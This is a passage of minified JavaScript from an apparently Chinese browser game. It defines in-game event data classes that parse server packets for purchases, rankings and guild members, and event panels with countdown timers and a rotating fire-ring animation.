__extends(e,t),e.prototype.update=function(t){this.dressId=t.readInt(),this.buyRecord=t.readInt(),this.hasRecharge=t.readInt(),console.log("buyRecord_____"+this.buyRecord)},Object.defineProperty(e.prototype,"hasPay",{get:function(){return this.dressId>0?o.GlobalConfig.ActivityType49Config[this.id][this.dressId].price:0},enumerable:!1,configurable:!0}),e.prototype.hasBuyById=function(t){return 1==(this.buyRecord>>t&1)},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e}(a.ActivityBaseData);e.ActivityType49Data=r,window.ActivityType49Data=r,__reflect(r.prototype,"ActivityType49Data",[]),window.ActivityType49Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType53Data=void 0;var n=i(8),o=i(7),s=i(33),a=function(t){function e(e){var i=t.call(this,e)||this;return i.idx=0,i.day=0,i.dayBuy=0,i.buyState=0,i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.idx=t.readShort(),this.day=t.readShort(),this.dayBuy=t.readByte(),this.buyState=t.readByte()},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.canReward=function(){return!1},e}(s.ActivityBaseData);e.ActivityType53Data=a,window.ActivityType53Data=a,__reflect(a.prototype,"ActivityType53Data",[]),window.ActivityType53Data=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType55Data=void 0;var n=i(8),o=i(0),s=i(7),a=i(33),r=function(t){function e(e,i,n,s){var r=t.call(this,e)||this;r.dic={},r.update(e),r.id=i;var l=o.GlobalConfig.ActivityConfig[i];return r.pageStyle=l.pageStyle,r.activityType=a.ActivityType.Normal,r.startTime=n,r.endTime=s,r}return __extends(e,t),e.prototype.update=function(t){this.dic={};for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt(),o=t.readShort();this.dic[n]=o}},e.prototype.postRewardResult=function(t){},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.canReward=function(){return!1},__decorate([post()],e.prototype,"postRewardResult",null),e}(a.ActivityBaseData);e.ActivityType55Data=r,window.ActivityType55Data=r,__reflect(r.prototype,"ActivityType55Data",[]),window.ActivityType55Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType56Data=void 0;var n=i(33),o=i(0),s=function(t){function e(e){var i=t.call(this,e)||this;return i.giftData={},i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.times=t.readUnsignedInt();for(var e=t.readByte(),i=0;e>i;i++)this.giftData[t.readByte()]=t.readByte()},e.prototype.canReward=function(){return!1},e.prototype.getHide=function(){var t=o.GlobalConfig.ActivityType56Config[this.id];if(!t)return!0;for(var e in t){var i=t[e].buyTimeLimit-this.giftData[t[e].giftId];if(i)return!1}return!0},e}(n.ActivityBaseData);e.ActivityType56Data=s,window.ActivityType56Data=s,__reflect(s.prototype,"ActivityType56Data",[]),window.ActivityType56Data=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType58Data=void 0;var n=i(33),o=i(213),s=i(30),a=function(t){function e(e){var i=t.call(this,e)||this;return i.cid=0,i.ranks=[],i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.cid=t.readShort()},e.prototype.postRewardResult=function(t){var e=t.readShort();if(2==e){var i=t.readInt();this.ranks=[];for(var n=0;i>n;n++){var a=o.PFVipCT.parserPFVipInfo(t);this.ranks.push({name:t.readString(),vip:t.readShort(),power:t.readDouble(),fpVipInfo:a})}}else if(1==e)for(var r=(t.readByte(),t.readInt()),l=[],n=0;r>n;n++){var h=new s.RewardData;h.parser(t),l.push(h)}},e}(n.ActivityBaseData);e.ActivityType58Data=a,window.ActivityType58Data=a,__reflect(a.prototype,"ActivityType58Data",[]),window.ActivityType58Data=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType59Data=void 0;var n=i(33),o=function(t){function e(e){var i=t.call(this,e)||this;return i.guildData=[],i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.guildData=[];for(var e=t.readByte(),i=0;e>i;i++){var n=t.readInt(),o=t.readString(),s=t.readByte(),a=t.readDouble();this.guildData.push({id:n,name:o,rank:s,power:a,member:[]})}for(var r=t.readByte(),l=0;r>l;l++){var h=t.readInt(),u=t.readInt(),s=t.readByte(),p=t.readString(),d=t.readByte(),c=t.readByte(),f=t.readByte(),g=t.readInt(),m=t.readInt(),v=t.readByte(),a=t.readDouble(),y=t.readString(),C=t.readInt();for(var T in this.guildData)this.guildData[T].id==h&&this.guildData[T].member.push({id:u,name:p,rank:s,servId:C,guildName:this.guildData[T].name,job:d,sex:c,vip:f,lv:g,zsLevel:m,monthCard:v,power:a,appId:y})}},e}(n.ActivityBaseData);e.ActivityType59Data=o,window.ActivityType59Data=o,__reflect(o.prototype,"ActivityType59Data",[]),window.ActivityType59Data=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType60Data=void 0;var n=i(33),o=function(t){function e(e){var i=t.call(this,e)||this;return i.info=[],i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.info=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte();this.info[n]={count:t.readInt(),state:t.readUnsignedByte()}}},e.prototype.canReward=function(){for(var t in this.info)if(1==this.info[t].state&&this.info[t].count)return!0;return!1},e}(n.ActivityBaseData);e.ActivityType60Data=o,window.ActivityType60Data=o,__reflect(o.prototype,"ActivityType60Data",[]),window.ActivityType60Data=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpenServerRankData=e.OpenServerData=e.ActivityType64Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(4),r=i(7),l=i(9),h=i(33),u=function(t){function e(e,i){var n=t.call(this,e,i)||this;return n.openServerRank=new p,n.rewardInfo={},n.curScore=0,n.rp=new o.RedPoint,n.initRp(),n.initRwardStatus(e),l.Activity.ins().reqOpenServerRankInfo(n.id),n}return __extends(e,t),e.prototype.initRp=function(){var t=this;this.rp.clearSub();var e=new o.RedPoint(function(){return t.canReward()},l.Activity.ins().postActivityIsGetAwards,l.Activity.ins().postOpenServerRankInfoChange);this.rp.addSub(e)},e.prototype.CleanRandData=function(){},e.prototype.initRwardStatus=function(t){this.curScore=t.readInt();for(var e=t.readShort(),i=0;e>i;i++){var n=t.readByte(),o=t.readByte();this.rewardInfo[n]=o}},e.prototype.update=function(t){var e=t.readByte();this.rewardInfo[e]=1},e.prototype.updateRankInfo=function(t){this.openServerRank.parse(t)},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.getleftTime=function(){if(!this.isOpenActivity())return 0;var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return t},e.prototype.checkRedPoint=function(){var t=s.GlobalConfig.ActivityType64Config[this.id],e=this.curScore||0;for(var i in t){var n=t[i];if(e>=n.taskCondition&&1!=this.rewardInfo[n.index])return!0}return!1},e}(h.ActivityBaseData);e.ActivityType64Data=u,window.ActivityType64Data=u,__reflect(u.prototype,"ActivityType64Data",[]),window.ActivityType64Data=u;var p=function(){function t(){this.rankList=[],this.curScore=0}return t.prototype.parse=function(t){this.rankList=[];for(var e=t.readShort(),i=0;e>i;i++){var n=new d;n.parse(t),this.rankList.push(n)}this.curScore=t.readInt()},Object.defineProperty(t.prototype,"myRank",{get:function(){for(var t=0;t<this.rankList.length;t++)if(a.ActorCC.actorID==this.rankList[t].actorId)return this.rankList[t].rank;return-1},enumerable:!1,configurable:!0}),t}();e.OpenServerData=p,window.OpenServerData=p,__reflect(p.prototype,"OpenServerData",[]);var d=function(){function t(){}return t.prototype.parse=function(t){this.actorId=t.readInt(),this.score=t.readInt(),this.rank=t.readInt(),this.serverId=t.readInt(),this.playerName=t.readString(),this.job=t.readByte(),this.zsLv=t.readUnsignedShort(),this.lv=t.readUnsignedShort(),this.outWard=t.readInt(),this.card=t.readInt(),this.power=t.readDouble()},t}();e.OpenServerRankData=d,window.OpenServerRankData=d,__reflect(d.prototype,"OpenServerRankData",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType65Data=void 0;
var n=i(8),o=i(0),s=i(7),a=i(9),r=i(33),l=function(t){function e(e){var i=t.call(this,e)||this;return i.awardIndex=0,i._data={},i._list=[],i.data={},i.list=[],i}return __extends(e,t),e.prototype.CleanRandData=function(){this._data={},this._list=[],this.data={},this.list=[]},e.prototype.SetRankData=function(t){this._list[t.rank-1]=t},e.prototype.SetQRankData=function(t){this.list[t.rank-1]=t,this.data[t.actorId]=t},e.prototype.GetRankData=function(){return this._data},e.prototype.GetRankList=function(){return this._list},e.prototype.GetQRankList=function(){return this.list},e.prototype.update=function(t){},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getleftTime=function(){if(!this.isOpenActivity())return 0;var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return t},e.prototype.checkRedPoint=function(){var t=o.GlobalConfig.ActivityType19Config[this.id][1];if(t.activityID){var e=a.Activity.ins().getActivityDataById(t.activityID);if(e&&e.canReward())return!0}return!1},e}(r.ActivityBaseData);e.ActivityType65Data=l,window.ActivityType65Data=l,__reflect(l.prototype,"ActivityType65Data",[]),window.ActivityType65Data=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType70Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=t.call(this,e)||this;return i.money=0,i.update(e),i.initRps(),i}return __extends(e,t),e.prototype.update=function(t){var e=t.readShort();this.achieveInfo=[];for(var i=0;e>i;i++){for(var n=t.readByte(),o=t.readByte(),s=t.readByte(),a=t.readByte(),r=[],l=0;a>l;l++){var h=t.readByte();r.push(h)}o>0&&(r=[]),this.achieveInfo[n]={idx:n,getCount:o,hasGetCount:s,hasArr:r}}this.money=t.readInt()},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){var e=s.GlobalConfig.ActivityType70Config[t.id];for(var i in e){var n=e[i],o=t.getAchieveInfo(n.index);if(o&&o.getCount>0)return!0}return!1},r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards)},e.prototype.getAchieveInfo=function(t){for(var e in this.achieveInfo)if(this.achieveInfo[e].idx==t)return this.achieveInfo[e]},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e}(l.ActivityBaseData);e.ActivityType70Data=h,window.ActivityType70Data=h,__reflect(h.prototype,"ActivityType70Data",[]),window.ActivityType70Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType71Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=t.call(this,e)||this;return i.money=0,i.update(e),i.initRps(),i}return __extends(e,t),e.prototype.update=function(t){var e=t.readShort();this.achieveInfo=[];for(var i=0;e>i;i++){for(var n=t.readByte(),o=t.readByte(),s=t.readByte(),a=t.readByte(),r=[],l=0;a>l;l++){var h=t.readByte();r.push(h)}var u=t.readInt();o>0&&(r=[]),this.achieveInfo[n]={idx:n,getCount:o,hasGetCount:s,hasArr:r,yuanbao:u}}},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){var e=s.GlobalConfig.ActivityType71Config[t.id];for(var i in e){var n=e[i],o=t.getAchieveInfo(n.index);if(o&&o.getCount>0)return!0}return!1},r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards)},e.prototype.getAchieveInfo=function(t){for(var e in this.achieveInfo)if(this.achieveInfo[e].idx==t)return this.achieveInfo[e]},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e}(l.ActivityBaseData);e.ActivityType71Data=h,window.ActivityType71Data=h,__reflect(h.prototype,"ActivityType71Data",[]),window.ActivityType71Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType72Data=void 0;var n=i(8),o=i(7),s=i(33),a=function(t){function e(e){var i=t.call(this,e)||this;return i.money=0,i.update(e),i}return __extends(e,t),e.prototype.update=function(t){t.readInt()},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e}(s.ActivityBaseData);e.ActivityType72Data=a,window.ActivityType72Data=a,__reflect(a.prototype,"ActivityType72Data",[]),window.ActivityType72Data=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType9Data=void 0;var n=i(8),o=i(7),s=i(9),a=i(33),r=function(t){function e(e){var i=t.call(this,e)||this;return i.indexsEx=[],i.update(e),i}return __extends(e,t),e.prototype.getIns=function(){var t=s.Activity.ins();return t},e.prototype.update=function(t){this.record=t.readInt(),this.count=t.readInt();var e=t.readByte();this.indexs=[];for(var i=0;e>i;i++)this.indexs.push(t.readByte());this.indexs.length&&(this.indexsEx=this.indexs),e=t.readByte(),this.noticeArr=[];for(var i=0;e>i;i++)this.noticeArr.push({name:t.readString(),itemId:t.readUnsignedInt()});this.noticeArr.reverse()},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){return this.getIns().getType9RedPoint(this.id)},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getLastTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3),e=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_5,3);return e},e.prototype.getStateByIndex=function(t){var e=this.record>>t&1;return e},e}(a.ActivityBaseData);e.ActivityType9Data=r,window.ActivityType9Data=r,__reflect(r.prototype,"ActivityType9Data",[]),window.ActivityType9Data=r},function(t,e){var i=function(){function t(){this.rank=0,this.actorId=0,this.level=0,this.serverId=0,this.roleName=""}return t}();window.QiongQiRankData=i,__reflect(i.prototype,"QiongQiRankData",[]),window.QiongQiRankData=i},function(t,e){},function(t,e){},function(t,e){},function(t,e){var i=function(t){function e(){var e=t.call(this)||this;return e.skinName="OSA41ComponentSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e}(eui.Button);window.OSA41YbItemRender=i,__reflect(i.prototype,"OSA41YbItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget0Panel=void 0;var n=i(16),o=i(0),s=i(29),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.getClsStr=function(t){var e={1:"OSATarget0Panel1",3:"OSATarget0Panel3",9:"OSATarget0Panel9"};return e[t.showType]||"OSATarget0Panel1"},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.cruPanel&&(this.cruPanel.close&&this.cruPanel.close(),n.DisplayUtils.removeFromParent(this.cruPanel));var i;if(!this.cruPanel||this.cruPanel.activityID!=this.activityID){i=o.GlobalConfig.ActivityBtnConfig[this.activityID],this._cfg=i;var s=egret.getDefinitionByName(this.getClsStr(i));this.cruPanel=new s(this.activityID),i.pageSkin&&(this.cruPanel._sn_=i.pageSkin),this.cruPanel.top=0,this.cruPanel.bottom=0,this.cruPanel.left=0,this.cruPanel.right=0,this.cruPanel.activityID=this.activityID}this.addChild(this.cruPanel),this.flusBanner()},e.prototype.flusBanner=function(){this.cruPanel.bannerImg&&this._cfg&&this._cfg.bannerImg&&(this.cruPanel.bannerImg.source=this._cfg.bannerImg)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.cruPanel&&this.cruPanel.close&&this.cruPanel.close()},e.prototype.updateData=function(){this.cruPanel&&this.cruPanel.updateData&&this.cruPanel.updateData()},__decorate([delayCall(200)],e.prototype,"flusBanner",null),e}(s.ActivityPanel);e.OSATarget0Panel=a,window.OSATarget0Panel=a,__reflect(a.prototype,"OSATarget0Panel",[]),window.OSATarget0Panel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget0Panel1=void 0;var n=i(8),o=i(16),s=i(5),a=i(1),r=i(11),l=i(0),h=i(7),u=i(9),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._time=0,e._angles=[0,0,0,0,0,0,0],e._circleCenter={x:168,y:120},e._a=155,e._b=80,e._angle=.1,e}return __extends(e,t),e.prototype.skinComplete=function(){this._rewardArr=new eui.ArrayCollection,this.list&&(this.list.itemRenderer=r.ItemBase,this.list.dataProvider=this._rewardArr)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.go,this.onTap),this.updateData(),Timer.start(1e3,0,this.setTime,this)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),Timer.stopAll(this),this.resetBalls()},e.prototype.onTap=function(t){switch(t.currentTarget){case this.go:var e=l.GlobalConfig.ActivityBtnConfig[this.activityID];if(!e.jump)return;switch(e.jump[0]){default:win.open(e.jump[1])}}},e.prototype.updateData=function(){var t=u.Activity.ins().getActivityDataById(this.activityID),e=Math.floor(t.startTime-h.GameServerCC.serverTime)/1e3,i=Math.floor(t.endTime-h.GameServerCC.serverTime)/1e3;e>=0?this.actTime.text=gettext("活动未开启"):0>=i?this.actTime.text=gettext("活动已结束"):(this.actTime.text=n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3),this._time=i);var o=l.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg&&o&&o.titleImg&&(this.titleImg.source=o.titleImg),this.actInfo.textFlow=s.TextFlowMaker.generateTextFlow1(o.acDesc);var a=l.GlobalConfig.ActivityBtnConfig[this.activityID];this._rewardArr.source=a.showReward},e.prototype.setTime=function(){this._time>0&&(this._time-=1,this.actTime.text=n.DateUtils.getFormatBySecond(this._time,n.DateUtils.TIME_FORMAT_5,3))},e.prototype.updateBalls=function(){if(this.img&&this.img.parent){var t=7;if(t){this.resetBalls(),this._balls||(this._balls=[],Timer.start(51,0,this.doCircle,this)),this._circleCenter.x=this.img.width/2,this._circleCenter.y=this.img.height/2+25;for(var e=void 0,i=2*Math.PI/t,n=0;t>n;n++)e=ObjectPool.pop("MovieClip"),this.img.parent.addChild(e),this._angles[n]=i*n,e.x=this._a*Math.cos(i*n)+this._circleCenter.x,e.y=this._b*Math.sin(i*n)+this._circleCenter.y,this._balls.push(e),e.playFile(RES_DIR_EFF+"FireRing1",-1)}}},e.prototype.doCircle=function(){if(!this._balls)return void Timer.stopAll(this);if(this.img&&this.img.parent)for(var t,e,i=this._balls.length,n=0,o=0,s=0;i>s;s++)t=this._balls[s],t.x=this._a*Math.cos(this._angles[s])+this._circleCenter.x,t.y=this._b*Math.sin(this._angles[s])+this._circleCenter.y,this._angles[s]+=this._angle,this._angles[s]=this._angles[s]%(2*Math.PI),e=t.parent,n=e.getChildIndex(this.img),o=e.getChildIndex(t),this._angles[s]>=2.5&&this._angles[s]<=6?o>n&&e.addChildAt(t,3):n>o&&e.addChildAt(t,e.numChildren)},e.prototype.resetBalls=function(){if(Timer.stopAll(this),this._balls){for(var t=this._balls.length,e=0;t>e;e++)o.DisplayUtils.removeFromParent(this._balls[e]);this._balls.length=0,this._balls=null}},e}(a.BaseView);e.OSATarget0Panel1=p,window.OSATarget0Panel1=p,__reflect(p.prototype,"OSATarget0Panel1",[]),window.OSATarget0Panel1=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget0Panel3=void 0;var n=i(8),o=i(16),s=i(5),a=i(1),r=i(11),l=i(0),h=i(7),u=i(9),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._time=0,e._angles=[0,0,0,0,0,0,0],e._circleCenter={x:168,y:120},e._a=155,e._b=80,e._angle=.1,e}return __extends(e,t),e.prototype.skinComplete=function(){this._rewardArr=new eui.ArrayCollection,this.list&&(this.list.itemRenderer=r.ItemBase,this.list.dataProvider=this._rewardArr)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.GlobalConfig.ActivityBtnConfig[this.activityID];this.bg&&i&&i.bgImg&&(this.bg.source=i.bgImg),this.bannerImg&&i&&i.bannerImg&&(this.bannerImg.source=i.bannerImg),this.go&&this.addTouchEvent(this.go,this.onTap),this.updateData(),Timer.start(1e3,0,this.setTime,this)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),Timer.stopAll(this),this.resetBalls()},e.prototype.onTap=function(t){switch(t.currentTarget){case this.go:var e=l.GlobalConfig.ActivityBtnConfig[this.activityID];if(!e.jump)return;switch(e.jump[0]){default:win.open(e.jump[1])}}},e.prototype.updateData=function(){var t=u.Activity.ins().getActivityDataById(this.activityID),e=Math.floor(t.startTime-h.GameServerCC.serverTime)/1e3,i=Math.floor(t.endTime-h.GameServerCC.serverTime)/1e3;e>=0?this.actTime.text=gettext("活动未开启"):0>=i?this.actTime.text=gettext("活动已结束"):(this.actTime.text=n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3),this._time=i);var o=l.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg&&o&&o.titleImg&&(this.titleImg.source=o.titleImg),this.actInfo.textFlow=s.TextFlowMaker.generateTextFlow1(o.acDesc);var a=l.GlobalConfig.ActivityBtnConfig[this.activityID];this._rewardArr.source=a.showReward},e.prototype.setTime=function(){this._time>0&&(this._time-=1,this.actTime.text=n.DateUtils.getFormatBySecond(this._time,n.DateUtils.TIME_FORMAT_5,3))},e.prototype.updateBalls=function(){if(this.img&&this.img.parent){var t=7;if(t){this.resetBalls(),this._balls||(this._balls=[],Timer.start(51,0,this.doCircle,this)),this._circleCenter.x=this.img.width/2,this._circleCenter.y=this.img.height/2+25;for(var e=void 0,i=2*Math.PI/t,n=0;t>n;n++)e=ObjectPool.pop("MovieClip"),this.img.parent.addChild(e),this._angles[n]=i*n,e.x=this._a*Math.cos(i*n)+this._circleCenter.x,e.y=this._b*Math.sin(i*n)+this._circleCenter.y,this._balls.push(e),e.playFile(RES_DIR_EFF+"FireRing1",-1)}}},e.prototype.doCircle=function(){if(!this._balls)return void Timer.stopAll(this);if(this.img&&this.img.parent)for(var t,e,i=this._balls.length,n=0,o=0,s=0;i>s;s++)t=this._balls[s],t.x=this._a*Math.cos(this._angles[s])+this._circleCenter.x,t.y=this._b*Math.sin(this._angles[s])+this._circleCenter.y,this._angles[s]+=this._angle,this._angles[s]=this._angles[s]%(2*Math.PI),e=t.parent,n=e.getChildIndex(this.img),o=e.getChildIndex(t),this._angles[s]>=2.5&&this._angles[s]<=6?o>n&&e.addChildAt(t,3):n>o&&e.addChildAt(t,e.numChildren)},e.prototype.resetBalls=function(){if(Timer.stopAll(this),this._balls){for(var t=this._balls.length,e=0;t>e;e++)o.DisplayUtils.removeFromParent(this._balls[e]);this._balls.length=0,this._balls=null}},e}(a.BaseView);e.OSATarget0Panel3=p,window.OSATarget0Panel3=p,__reflect(p.prototype,"OSATarget0Panel3",[]),window.OSATarget0Panel3=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget0Panel9=void 0;var n=i(8),o=i(16),s=i(5),a=i(1),r=i(0),l=i(7),h=i(9),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._angles=[0,0,0,0,0,0,0],e._circleCenter={x:168,y:120},e._a=155,e._b=80,e._angle=.1,e.startTime=0,e.endTime=0,e._sn_="BossCdCutSkin",e}return __extends(e,t),e.prototype.setCurSkin=function(){var t=r.GlobalConfig.ActivityBtnConfig[this.activityID];(null===t||void 0===t?void 0:t.pageSkin)&&(this._sn_=t.pageSkin)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setCurSkin(),this.addTouchEvent(this.pay0,this.onTap),this.updateData(),Timer.start(1e3,0,this.setTime,this)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),Timer.stopAll(this),this.resetBalls()},e.prototype.onTap=function(t){switch(t.currentTarget){case this.pay0:var e=r.GlobalConfig.ActivityBtnConfig[this.activityID];if(!e.jump)return;switch(e.jump[0]){default:win.open(e.jump[1])}}},e.prototype.updateData=function(){var t=h.Activity.ins().getActivityDataById(this.activityID);this.startTime=t?t.startTime:0,this.endTime=t?t.endTime:0;var e=r.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg&&e&&e.titleImg&&(this.titleImg.source=e.titleImg),this.actInfo.textFlow=s.TextFlowMaker.generateTextFlow1(e.acDesc);r.GlobalConfig.ActivityBtnConfig[this.activityID]},e.prototype.setTime=function(){var t=Math.floor((this.startTime-l.GameServerCC.serverTime)/1e3),e=Math.floor((this.endTime-l.GameServerCC.serverTime)/1e3);t>=0?this.actTime.text=gettext("活动未开启"):0>=e?this.actTime.text=gettext("活动已结束"):this.actTime.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.updateBalls=function(){if(this.img&&this.img.parent){var t=7;if(t){this.resetBalls(),this._balls||(this._balls=[],Timer.start(51,0,this.doCircle,this)),this._circleCenter.x=this.img.width/2,this._circleCenter.y=this.img.height/2+25;for(var e=void 0,i=2*Math.PI/t,n=0;t>n;n++)e=ObjectPool.pop("MovieClip"),this.img.parent.addChild(e),this._angles[n]=i*n,e.x=this._a*Math.cos(i*n)+this._circleCenter.x,e.y=this._b*Math.sin(i*n)+this._circleCenter.y,this._balls.push(e),e.playFile(RES_DIR_EFF+"FireRing1",-1)}}},e.prototype.doCircle=function(){if(!this._balls)return void Timer.stopAll(this);if(this.img&&this.img.parent)for(var 